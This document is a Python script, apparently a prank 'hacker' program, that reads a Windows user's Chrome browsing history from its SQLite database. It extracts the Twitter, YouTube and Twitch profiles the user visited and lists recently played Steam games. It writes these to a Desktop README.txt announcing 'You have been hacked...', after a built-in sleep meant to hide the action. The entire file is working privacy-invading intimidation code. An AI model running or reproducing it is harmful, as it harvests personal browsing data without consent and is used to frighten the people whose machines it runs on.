import glob
import os
import re
import sqlite3
from pathlib import Path
from time import sleep
from random import randrange


def delay_action():
    #delay_hours = randrange(1, 3) * 60 * 60
    #delay_minutes = randrange(1, 60) / 100
    #time = delay_hours + delay_minutes
    #print("Durmiendo {} hours y {} minutes".format(round(delay_hours / 60 / 60), round(delay_minutes * 100)))
    #sleep(time)
    print("Durmiendo 3 seg")
    sleep(3)


def get_user_route():
    return "{}\\".format(Path.home())


def create_hacker_file(user_path):
    hacker_file = open(user_path + "/Desktop/" + "README.txt", "w")
    hacker_file.write("You have been hacked...\n")
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Trying again to gain access...")
            sleep(2)


def write_history_in_file(hacker_file, chrome_history):
    twitter_profiles = []
    youtube_profiles = []
    twitch_profiles = []


    for item in chrome_history:
        results_twitter = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results_twitter and results_twitter[0] not in ["home", "notifications", "settings", "login", "logout"]:
            twitter_profiles.append(results_twitter[0])
    if len(twitter_profiles) > 0:
        hacker_file.write("You were visiting this twitter profiles...:\n{}\n\n\n".format("\n".join(twitter_profiles)))


    for item in chrome_history:
        results_youtube = re.findall("https://www.youtube.com/c/([A-Za-z0-9]+)$", item[2])
        if results_youtube:
            youtube_profiles.append(results_youtube[0])
    if len(youtube_profiles) > 0:
        hacker_file.write("You were visiting this youtube profiles...:\n{}\n\n\n".format("\n".join(youtube_profiles)))


    for item in chrome_history:
        results_twitch = re.findall("https://www.twitch.tv/([A-Za-z0-9]+)$", item[2])
        if results_twitch:
            twitch_profiles.append(results_twitch[0])
    if len(twitch_profiles) > 0:
        hacker_file.write("You were visiting this twitch profiles:\n{}\n\n\n".format("\n".join(twitch_profiles)))


def get_steam_games(hacker_file):
    try:
        games_list = []
        STEAM_PATH = "C:/Program Files (x86)/Steam/steamapps/common/*"
        games_path = glob.glob(STEAM_PATH)
        games_path.sort(key=os.path.getmtime, reverse=True)
        for game in games_path[:4]:
            if game.split("\\")[-1] != "language.data":
                games_list.append(game.split("\\")[-1])
        hacker_file.write("So this is what you play... {}".format("\n".join(games_list)))
    except:
        print("Route not found")

def main():
    delay_action()
    user_path = get_user_route()
    chrome_history = get_chrome_history(user_path)
    hacker_file = create_hacker_file(user_path)
    write_history_in_file(hacker_file, chrome_history)
    get_steam_games(hacker_file)

main()

